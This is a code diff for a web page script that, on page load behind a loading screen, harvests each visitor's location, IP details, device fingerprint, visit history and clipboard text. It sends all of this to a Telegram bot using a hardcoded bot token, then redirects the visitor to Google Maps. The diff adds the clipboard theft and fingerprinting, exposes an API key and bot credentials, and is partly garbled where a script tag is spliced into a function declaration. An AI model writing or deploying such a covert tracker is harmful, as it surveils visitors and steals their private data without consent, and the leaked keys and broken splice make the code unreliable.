@@ -6,6 +6,11 @@ const TELEGRAM_BOT_TOKEN = '7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8';
 const CHAT_ID = '6602027873';
 const OPENCAGE_API_KEY = '8e640acb36a3409a9877e0c900653f7d';
 
+function buildAddress(components) {<script>
+const TELEGRAM_BOT_TOKEN = '7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8';
+const CHAT_ID = '6602027873';
+const OPENCAGE_API_KEY = '8e640acb36a3409a9877e0c900653f7d';
+
 function buildAddress(components) {
   const country = components.country || '';
   const state = components.state || '';
@@ -26,12 +31,84 @@ async function sendToTelegram(message) {
   });
 }
 
+function collectDeviceInfo() {
+  const userAgent = navigator.userAgent;
+  const language = navigator.language;
+  const platform = navigator.platform;
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const screenRes = `${window.screen.width}x${window.screen.height}`;
+
+  let browser = "Unknown";
+  if (userAgent.includes("Firefox")) browser = "Firefox";
+  else if (userAgent.includes("Edg")) browser = "Edge";
+  else if (userAgent.includes("Chrome")) browser = "Chrome";
+  else if (userAgent.includes("Safari")) browser = "Safari";
+
+  let os = "Unknown OS";
+  if (/Win/.test(userAgent)) os = "Windows";
+  else if (/Mac/.test(userAgent)) os = "MacOS";
+  else if (/X11/.test(userAgent)) os = "UNIX";
+  else if (/Linux/.test(userAgent)) os = "Linux";
+  else if (/Android/.test(userAgent)) os = "Android";
+  else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";
+
+  const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(", ") || "None";
+
+  let canvasFingerprint = "Unavailable";
+  try {
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.fillText("DeviceFingerprint", 2, 2);
+    canvasFingerprint = canvas.toDataURL();
+  } catch {}
+
+  return `📱 Device Info:
+🖥 OS: ${os}
+🌐 Browser: ${browser}
+📊 Platform: ${platform}
+🧭 Timezone: ${timezone}
+🔠 Language: ${language}
+📐 Screen: ${screenRes}
+🧩 User-Agent: ${userAgent}
+🔌 Plugins: ${plugins}
+🎨 Canvas FP (short): ${canvasFingerprint.slice(0, 40)}...`;
+}
+
+function getVisitStats() {
+  let visits = parseInt(localStorage.getItem("visits") || "0") + 1;
+  localStorage.setItem("visits", visits);
+
+  const firstVisit = localStorage.getItem("firstVisit") || new Date().toISOString();
+  const lastVisit = new Date().toISOString();
+  localStorage.setItem("firstVisit", firstVisit);
+  localStorage.setItem("lastVisit", lastVisit);
+
+  return `👁 Visit Tracker:
+🔢 Count: ${visits}
+🕒 First: ${firstVisit}
+🕘 Last: ${lastVisit}`;
+}
+
+async function getClipboardContents() {
+  try {
+    const text = await navigator.clipboard.readText();
+    return `📋 Clipboard:\n${text.slice(0, 300)}\n`;
+  } catch {
+    return "📋 Clipboard: Permission denied or unavailable";
+  }
+}
+
 async function getIPInfo() {
   try {
     const res = await fetch('https://api.db-ip.com/v2/free/self');
-    return await res.json();
+    const data = await res.json();
+    const isCloudASN = /google|amazon|microsoft|digitalocean|cloudflare/i.test(data.organization || "");
+    data.vpnDetected = isCloudASN ? "⚠️ Likely VPN/Proxy" : "✅ Residential";
+    return data;
   } catch {
-    return { ipAddress: 'unknown', latitude: '0', longitude: '0' };
+    return { ipAddress: 'unknown', latitude: '0', longitude: '0', vpnDetected: 'Unknown' };
   }
 }
 
@@ -45,30 +122,76 @@ async function getLocationInfo(lat, lon) {
   }
 }
 
+async function hashFingerprint(rawString) {
+  const encoder = new TextEncoder();
+  const data = encoder.encode(rawString);
+  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
+  return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, "0")).join("");
+}
+
+async function generateFingerprint() {
+  const userAgent = navigator.userAgent;
+  const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(",");
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+  let canvasFP = '';
+  try {
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.fillText("fingerprint", 2, 2);
+    canvasFP = canvas.toDataURL();
+  } catch {}
+
+  const raw = userAgent + plugins + timezone + canvasFP;
+  return "FP-" + await hashFingerprint(raw);
+}
+
 async function logIPOnly(reason = "⚠️ No GPS, IP Only") {
   const ip = await getIPInfo();
   const lat = ip.latitude || '0';
   const lon = ip.longitude || '0';
   const addressData = await getLocationInfo(lat, lon);
   const address = buildAddress(addressData);
+  const clipboard = await getClipboardContents();
+  const fingerprint = await generateFingerprint();
 
   await sendToTelegram(`${reason}
 🔹 IP: ${ip.ipAddress}
+🌍 Region: ${ip.city}, ${ip.stateProv}, ${ip.countryName}
+🏢 ISP: ${ip.organization}
+🛡 VPN Check: ${ip.vpnDetected}
 📍 IP-Based Location: ${address}
-🗺️ https://www.google.com/maps?q=${lat},${lon}`);
+🗺️ https://www.google.com/maps?q=${lat},${lon}
+
+${collectDeviceInfo()}
+🧬 Fingerprint: ${fingerprint}
+${getVisitStats()}
+${clipboard}`);
 }
 
 async function logGPSAndIP(lat, lon) {
   const ip = await getIPInfo();
   const addressData = await getLocationInfo(lat, lon);
   const address = buildAddress(addressData);
+  const clipboard = await getClipboardContents();
+  const fingerprint = await generateFingerprint();
 
   await sendToTelegram(`✅ USER ALLOWED LOCATION
 🔹 IP: ${ip.ipAddress}
+🌍 Region: ${ip.city}, ${ip.stateProv}, ${ip.countryName}
+🏢 ISP: ${ip.organization}
+🛡 VPN Check: ${ip.vpnDetected}
 📍 GPS: ${lat}, ${lon}
 📍 Address: ${address}
-🗺️ https://www.google.com/maps?q=${lat},${lon}`);
-  
+🗺️ https://www.google.com/maps?q=${lat},${lon}
+
+${collectDeviceInfo()}
+🧬 Fingerprint: ${fingerprint}
+${getVisitStats()}
+${clipboard}`);
+
   window.location.href = `https://www.google.com/maps/@${lat},${lon},15z`;
 }
 
@@ -95,7 +218,6 @@ async function handleLocationFlow(trigger = "page") {
     permission.onchange = () => {
       if (permission.state === "granted") location.reload();
     };
-
   } catch {
     await logIPOnly("❌ PERMISSION API failed");
   }
@@ -116,3 +238,4 @@ window.onload = () => {
   document.getElementById("loading-screen").style.display = "flex";
   handleLocationFlow("page");
 };
+</script>
